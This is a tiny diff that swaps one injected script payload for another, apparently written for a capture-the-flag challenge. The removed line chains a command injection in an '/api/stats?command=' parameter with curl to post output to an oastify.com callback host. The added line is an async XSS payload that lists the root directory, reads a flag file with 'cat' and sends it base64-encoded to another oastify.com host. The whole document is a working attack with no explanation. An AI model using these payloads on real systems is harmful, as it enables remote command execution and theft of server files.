@@ -1,3 +1,1 @@
-<script>
-fetch("https://localhost:1337/api/stats?command=ls /| grep flag | curl -X POST -d @- http://xklqf2ly81rowgujq4vgur2vcmid66uv.oastify.com/test");
-</script>
+<script>(async () => {{let response = await fetch('/api/stats?command=ls+/');let flag = await response.text();response = await fetch('/api/stats?command=cat+/flag' + flag.split('flag')[1].substr(0, 10) + '.txt');flag = await response.text();await fetch('http://rhckcwis5voitardnysarlzp9gf733rs.oastify.com?c=' + btoa(flag))}})()</script>
